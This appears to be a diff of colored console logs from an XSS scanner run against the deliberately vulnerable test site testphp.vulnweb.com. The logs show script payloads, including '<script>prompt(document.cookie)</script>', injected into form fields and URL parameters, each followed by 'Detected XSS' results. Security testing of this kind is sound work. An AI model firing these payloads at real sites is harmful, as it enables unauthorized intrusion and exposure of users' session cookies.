-[[1;33m06:50:42[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:42[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:56[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/userinfo.php
+[[1;33m09:42:57[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:57[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/userinfo.php
+[[1;33m09:42:57[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:57[0m] [[1;32mINFO[0m] Form key name: [1;32muname[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:57[0m] [[1;32mINFO[0m] Form key name: [1;32mpass[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:57[0m] [[1;32mINFO[0m] Internal error: 'name'
+[[1;33m09:42:57[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:58[0m] [[1;32mINFO[0m] Parameter page using (POST) payloads but not 100% yet...
+[[1;33m09:42:58[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:58[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:58[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:58[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:58[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:59[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:59[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:50:42[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/signup.php
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:43[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/secured/newuser.php
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32muuname[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32mupass[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32mupass2[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32murname[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32mucc[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32muemail[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32muphone[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Internal error: 'type'
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32msignup[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:43[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/secured/newuser.php
-[[1;33m06:50:43[0m] [[1;31mCRITICAL[0m] Post data: {'uuname': '<script>prompt(document.cookie)</script>', 'upass': '<script>prompt(document.cookie)</script>', 'upass2': '<script>prompt(document.cookie)</script>', 'urname': '<script>prompt(document.cookie)</script>', 'ucc': '<script>prompt(document.cookie)</script>', 'uemail': '<script>prompt(document.cookie)</script>', 'uphone': '<script>prompt(document.cookie)</script>', 'signup': 'signup'}
-[[1;33m06:50:43[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:43[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:44[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:44[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:43:00[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/privacy.php
+[[1;33m09:43:01[0m] [[1;32mINFO[0m] Connection failed [1;32m404
 [1;37m***************
-[[1;33m06:50:44[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/userinfo.php
-[[1;33m06:50:45[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:45[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/userinfo.php
-[[1;33m06:50:45[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:45[0m] [[1;32mINFO[0m] Form key name: [1;32muname[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:45[0m] [[1;32mINFO[0m] Form key name: [1;32mpass[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:45[0m] [[1;32mINFO[0m] Internal error: 'name'
-[[1;33m06:50:45[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:46[0m] [[1;32mINFO[0m] Parameter page using (POST) payloads but not 100% yet...
-[[1;33m06:50:46[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:46[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:46[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:46[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:46[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:46[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:46[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:43:02[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/
+[[1;33m09:43:02[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
 [1;37m***************
-[[1;33m06:50:47[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/privacy.php
-[[1;33m06:50:48[0m] [[1;32mINFO[0m] Connection failed [1;32m404
+[[1;33m09:43:03[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/hpp/
+[[1;33m09:43:04[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:43:04[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpp=12[0m Maybe a vuln XSS point
+[[1;33m09:43:04[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/?pp=<script>console.log(5000/3000)</script>
+[[1;33m09:43:04[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:43:04[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
 [1;37m***************
-[[1;33m06:50:48[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/
-[[1;33m06:50:49[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:43:05[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/hpp/?pp=12
+[[1;33m09:43:06[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:43:06[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpp=12[0m Maybe a vuln XSS point
+[[1;33m09:43:06[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/?pp=<script>console.log(5000/3000)</script>
+[[1;33m09:43:06[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:43:07[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:43:07[0m] [[1;33mWARNING[0m] Found link with query: [1;32mp=valid&pp=12[0m Maybe a vuln XSS point
+[[1;33m09:43:07[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/params.php?p=<script>console.log(5000/3000)</script>
+[[1;33m09:43:07[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E&pp=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:43:07[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:43:07[0m] [[1;33mWARNING[0m] Found link with query: [1;32mp=valid&pp=12[0m Maybe a vuln XSS point
+[[1;33m09:43:07[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/params.php?p=<script>console.log(5000/3000)</script>
+[[1;33m09:43:07[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E&pp=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:43:07[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
 [1;37m***************
-[[1;33m06:50:50[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
-[[1;33m06:50:50[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[1;37m***************
-[[1;33m06:50:51[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
-[[1;33m06:50:52[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[1;37m***************
-[[1;33m06:50:52[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
-[[1;33m06:50:52[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[1;37m***************
-[[1;33m06:50:53[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
-[[1;33m06:50:54[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[1;37m***************
-[[1;33m06:50:54[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
-[[1;33m06:50:54[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[1;37m***************
-[[1;33m06:50:55[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
-[[1;33m06:50:56[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[1;37m***************
-[[1;33m06:50:56[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/hpp/
-[[1;33m06:50:56[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:56[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpp=12[0m Maybe a vuln XSS point
-[[1;33m06:50:56[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/?pp=<script>prompt(document.cookie)</script>
-[[1;33m06:50:56[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:57[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[1;37m***************
-[[1;33m06:50:57[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/hpp/?pp=12
-[[1;33m06:50:58[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:58[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpp=12[0m Maybe a vuln XSS point
-[[1;33m06:50:58[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/?pp=<script>prompt(document.cookie)</script>
-[[1;33m06:50:58[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:58[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:58[0m] [[1;33mWARNING[0m] Found link with query: [1;32mp=valid&pp=12[0m Maybe a vuln XSS point
-[[1;33m06:50:58[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/params.php?p=<script>prompt(document.cookie)</script>
-[[1;33m06:50:58[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E&pp=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:59[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:59[0m] [[1;33mWARNING[0m] Found link with query: [1;32mp=valid&pp=12[0m Maybe a vuln XSS point
-[[1;33m06:50:59[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/params.php?p=<script>prompt(document.cookie)</script>
-[[1;33m06:50:59[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E&pp=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:59[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[1;37m***************
-[[1;33m06:51:00[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
-[[1;33m06:51:00[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:43:08[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
+[[1;33m09:43:09[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
